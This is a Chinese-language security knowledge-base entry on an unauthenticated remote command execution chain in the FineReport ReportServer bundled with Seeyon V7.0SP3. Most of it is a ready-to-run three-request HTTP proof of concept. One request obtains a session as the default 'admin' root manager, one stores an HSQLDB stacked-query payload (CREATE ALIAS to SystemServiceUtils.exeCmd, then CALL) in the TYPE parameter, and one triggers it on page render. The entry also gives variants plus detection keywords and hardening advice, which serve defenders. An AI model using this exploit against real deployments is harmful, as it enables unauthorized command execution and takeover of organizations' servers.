---
id: web-java-component-finereport-reportserver-hsql-param-rce
title: FineReport ReportServer 无会话参数注入 HSQL 堆叠语句，page_content 渲染时二次触发 RCE
type: scenario
domain: web
path: web/java/component
technique: finereport-reportserver-hsql-stored-param-injection
tags:
- java
- finereport
- seeyon
- hsqldb
- sqli
- stacked-queries
- rce
- create-alias
- session-parameter
cve: []
severity: critical
confidence: high
affected_versions: 致远 V7.0SP3（内置帆软 FineReport ReportServer）
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V39
  verified_at: '2026-11-05T06:30:29+08:00'
  notes: 已对照原文与24张图核对：fr_log→DC.actionOP（图01）、rootManagerName=admin/rootManagerPassword=123456（图02/03）、fg_errinfo→AD.getCMD（图04）、内嵌 logerr_info.cpt 生成 sessionID 并在响应 FR.SessionMgr.register 注册（图08-10）、parameters_d 的 PD 分支与 getSession(false)=null（图11-14）、applySessionIDInforParameters 把 TYPE 的 HSQL 堆叠 payload 写入 parameterMap4Execute（图15/16）、page_content→BC→RB→FC.A→getReportPage(pn)→WorkSheet.execute→com.fr.report.core.A.J.C 调用栈（图17-24）。未验证点：原文声称弹出计算器但未给命令输出/计算器截图，也未展示 fr_errrecord 查询错误回显，最终命令执行的直接证据仅为作者陈述；PoC 未本机复跑。affected_versions 按原文标题致远 V7.0SP3 保留；frontmatter 无 sources/source_url。
url: /docs/web/java/component/web-java-component-finereport-reportserver-hsql-param-rce/
draft: false
kb_aliases:
- 帆软 FineReport fr_log RCE
- FineReport ReportServer HSQL 注入
- 致远 V7.0SP3 报表 RCE
- fr_dialog parameters_d 注入
- page_content 触发 CREATE ALIAS
---

## 一句话结论

致远 V7.0SP3 内置的 FineReport `ReportServer` 中，`op=fr_log&cmd=fg_errinfo&fr_username=admin` 在不知道会话的情况下就能签发 sessionID；随后 `op=fr_dialog&cmd=parameters_d` 把攻击者的 `TYPE` 参数原样存进服务端 `ReportSessionIDInfor.parameterMap4Execute`，最后 `op=page_content` 渲染报表时该参数进入 HSQL 查询，形成堆叠注入，用 `CREATE ALIAS ... FOR "com.fr.chart.phantom.system.SystemServiceUtils.exeCmd"` + `CALL` 执行任意命令。

## 原理

链路分为三段，前两段只做“准备”，真正的查询执行推迟到第三次请求：

1. **r0 获取 sessionID（无会话服务）**：`/seeyonreport/ReportServer?op=fr_log&cmd=fg_errinfo&fr_username=admin`
   - `com.fr.web.core.A.DC` 继承 `NoSessionIDService`，`process()` 先把 `fr_username` 与 `PrivilegeManager.getRootManagerName()` 比较；FineReport 默认 root manager 名为 `admin`（源码中 `rootManagerName = "admin"`、`rootManagerPassword = "123456"`），相等才继续。
   - 通过后 `WebActionsDispatcher.dealForActionNoSessionIDCMD` 按 `cmd` 匹配到 `com.fr.web.core.A.AD`（`getCMD()` 返回 `fg_errinfo`）。
   - `AD` 调用 `ReportletDealWith.dealWithEmbeddedReportlet` 渲染内置日志模板 `/com/fr/web/log/logerr_info.cpt`，`dealWithEmbeddedReportlet` 内 `SessionDealWith.generateSessionID` 生成 sessionID 并注册到前端 JS：`FR.SessionMgr.register("<sessionID>", contentPane)`，从响应中可直接正则提取。
2. **r1 把恶意参数存入会话上下文**：`POST /seeyonreport/ReportServer?op=fr_dialog&cmd=parameters_d&sessionID=<id>&fr_username=admin`，表单 `__parameters__` 为 JSON。
   - `com.fr.web.core.A.PD.actionCMD` 用 sessionID 从 `SessionDealWith.sessionIDMap` 取到 `ReportSessionIDInfor`，再调用 `applySessionIDInforParameters`。
   - 该方法用 `WebUtils.parameters4SessionIDInfor(request)` 收集参数：依次从 HttpSession、request attribute、request parameter、JSON body、原始请求流读取，全部 `putAll` 进 `parameterMap4Execute`，即绑定到该 session 的执行上下文。
   - 这一步不会触发查询，只完成“存储”。
3. **r2 渲染页面触发查询**：`GET /seeyonreport/ReportServer?op=page_content&sessionID=<id>&pn=1`
   - `com.fr.web.core.A.BC` → `dealForActionDefaultCmd(..., "html")` → 匹配到 `RB` → `FC.A().A(sessionID, req, resp)`。
   - `FC.A` 从 sessionID 取 `ReportSessionIDInfor`，`getReportPage(pn)` 调 `createPageSetChain()`，再到 `ReportSessionIDInfor.callResultWorkBook` → `WorkBook.execute` → `WorkSheet.execute` → `com.fr.report.core.A.J` 的 `C` 方法执行报表查询。
   - `logerr_info.cpt` 的数据源 `Err2RecordDBTableData` 查询 `fr_errrecord`，其中 `TYPE` 参数来自 session 上下文。攻击者传入的 `TYPE` 值 `6;CREATE ALIAS RUMCMD FOR "com.fr.chart.phantom.system.SystemServiceUtils.exeCmd";CALL RUMCMD('calc');select msg, trace, sinfo, logtime from fr_errrecord where 1=1` 在 HSQLDB 中形成堆叠语句：先注册别名指向 FineReport 自带的命令执行工具 `SystemServiceUtils.exeCmd`，再 `CALL` 执行命令。
   - 因为注入值先在 r1 被持久化、r2 才被拼接执行，WAF 若只检查“触发请求”会漏掉 r1 中的 payload；r2 的 GET 看起来只是普通翻页。

## 触发条件

- 目标为致远 V7.0SP3 等内置 FineReport ReportServer 的部署，`/seeyonreport/ReportServer` 可达，且 `fr_log` 无会话服务开启。
- root manager 名仍为默认值 `admin`（或攻击者已知实际值）；这是 r0 鉴权的唯一条件。
- 后端报表日志库为 HSQLDB（FineReport 内置日志库默认形态），允许堆叠语句与 `CREATE ALIAS`。
- 能完成 r0 → r1 → r2 三步并复用同一个 sessionID；sessionID 有时效，需连续请求。
- 目标 classpath 存在 `com.fr.chart.phantom.system.SystemServiceUtils`（FineReport 自带）。

## 利用步骤

1. `GET /seeyonreport/ReportServer?op=fr_log&cmd=fg_errinfo&fr_username=admin`，从响应中提取 `sessionID=...`（或 `FR.SessionMgr.register("...")`）。
2. 向 `?op=fr_dialog&cmd=parameters_d&sessionID=<id>&fr_username=admin` POST `__parameters__`，`TYPE` 填入 HSQL 堆叠 payload，其余字段（LABEL、START_TIME、END_TIME、LIMIT）保持模板要求。
3. `GET /seeyonreport/ReportServer?op=page_content&sessionID=<id>&pn=1` 触发报表渲染；`TYPE` 进入查询后执行 `CREATE ALIAS` 与 `CALL`。
4. 观察命令回显/副作用；同一个 session 可重复换命令，只需重新执行 r1 覆盖参数再 r2。

## PoC

```http
GET /seeyonreport/ReportServer?op=fr_log&cmd=fg_errinfo&fr_username=admin HTTP/1.1
Host: target
```

从响应提取 sessionID 后：

```http
POST /seeyonreport/ReportServer?op=fr_dialog&cmd=parameters_d&sessionID=<id>&fr_username=admin HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

__parameters__={"LABEL1":"TYPE:","TYPE":"6;CREATE ALIAS RUMCMD FOR \"com.fr.chart.phantom.system.SystemServiceUtils.exeCmd\";CALL RUMCMD('calc');select msg, trace, sinfo, logtime from fr_errrecord where 1=1","LABEL3":"START_TIME:","START_TIME":"2020-08-11 00:00","LABEL5":"END_TIME:","END_TIME":"2020-08-11 16:41","LABEL7":"LIMIT:","LIMIT":2}
```

触发：

```http
GET /seeyonreport/ReportServer?op=page_content&sessionID=<id>&pn=1 HTTP/1.1
Host: target
```

原文验证：调试确认 `TYPE` 的 payload 被写入 `ReportSessionIDInfor.parameterMap4Execute`（图 15/16），`page_content` 调用栈到达 `com.fr.report.core.A.J.C`（图 24），并声称在此处弹出计算器。把 `CALL RUMCMD('calc')` 换成 `whoami`、`id` 等命令即可验证。

## 变体与关联

- 命令执行类可换：`SystemServiceUtils.exeCmd` 是 FineReport 自带类；也可用 HSQLDB 的其他 `CREATE ALIAS` 目标或 Java 静态方法。
- 触发入口可换：任何会执行 `Err2RecordDBTableData` 查询的报表渲染/预览请求都等价于 r2，`pn` 只是选页参数。
- 存储位置可换：`parameters4SessionIDInfor` 同时收集 Session、Attribute、Parameter、JSON、InputStream，任一来源可写都会被合并进执行上下文；这也是“二次注入/存储型参数注入”的通用形态。
- 关联：[[web-java-deserialization-h2-jdbc-init-create-alias-rce]]（H2 的 `CREATE ALIAS` 命令执行，机制同类但数据库不同）；[[web-java-component-dataease-json-driver-override-jdbc-rce]]（报表/BI 产品通过 JDBC 参数走到 RCE）。
- 边界：root manager 名被修改、`fr_log` 被禁用、后端改为非 HSQLDB、或对 `TYPE` 做参数化/白名单后失效。

## 检测与防御

- 检测：`ReportServer?op=fr_log` 的匿名访问，尤其 `fr_username=admin` 且随后紧跟 `parameters_d` 与 `page_content` 的同一 sessionID 序列。
- 检测：`__parameters__` 中出现 `CREATE ALIAS`、`CALL `、`;` 堆叠、`SystemServiceUtils.exeCmd`、`java.lang.Runtime` 等关键字；`TYPE` 参数出现非数字内容。
- 检测：HSQLDB 日志中出现 `CREATE ALIAS`、`CALL` 语句；报表进程异常创建子进程。
- 防御：修改 FineReport root manager 默认口令/名称；关闭 `fr_log` 等无会话服务或限制来源。
- 防御：报表参数全部参数化查询，禁止拼接进 SQL；禁用 HSQLDB 堆叠语句与 `CREATE ALIAS` 权限；升级致远/FineReport 到修复版本。
- 加固：`/seeyonreport/ReportServer` 仅对内网开放；WAF 对 `__parameters__` 做 JSON 解析后逐字段检查，而不是只看原始 body。
